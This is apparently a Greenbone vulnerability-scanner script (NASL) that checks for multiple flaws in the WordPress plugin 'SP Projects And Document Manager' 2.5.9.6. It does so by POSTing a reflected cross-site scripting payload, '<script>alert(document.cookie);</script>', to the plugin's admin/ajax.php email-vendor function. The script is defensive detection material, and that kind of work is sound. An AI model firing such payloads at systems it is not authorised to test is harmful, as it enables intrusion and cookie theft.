# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807612");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2016-03-16 10:39:38 +0530 (Wed, 16 Mar 2016)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("WordPress SP Projects And Document Manager Multiple Vulnerabilities");

  script_tag(name:"summary", value:"The WordPress plugin 'SP Projects And Document Manager' is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is possible to read a cookie value.");

  script_tag(name:"insight", value:"Multiple flaws exist due to:

  - An insufficient validation of input to the 'id' parameter in admin/ajax.php.

  - An insufficient validation of input to the 'email-vendor' parameter in
    admin/ajax.php.");

  script_tag(name:"impact", value:"Successful exploitation will allow registered
  users to perform arbitrary file upload and code execution, and remote attackers
  to perform sql injections, information leakage and xss.");

  script_tag(name:"affected", value:"WordPress Sp client document manager plugin
  version 2.5.9.6.");

  script_tag(name:"solution", value:"Update to WordPress Sp client document
  manager plugin version 2.6.0.0 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/136105/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://wordpress.org/support/plugin/sp-client-document-manager");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/sp-client-document-manager/admin/ajax.php?function=email-vendor";

useragent = http_get_user_agent();

postData = "vendor_email[]=1&vendor=<script>alert(document.cookie);</script>";
len = strlen(postData);

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

req = 'POST ' + url + ' HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' +
      postData;

res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 200" && res =~ "<script>alert\(document\.cookie\);</script>" && 'Files Sent to' >< res) {
  report = http_report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
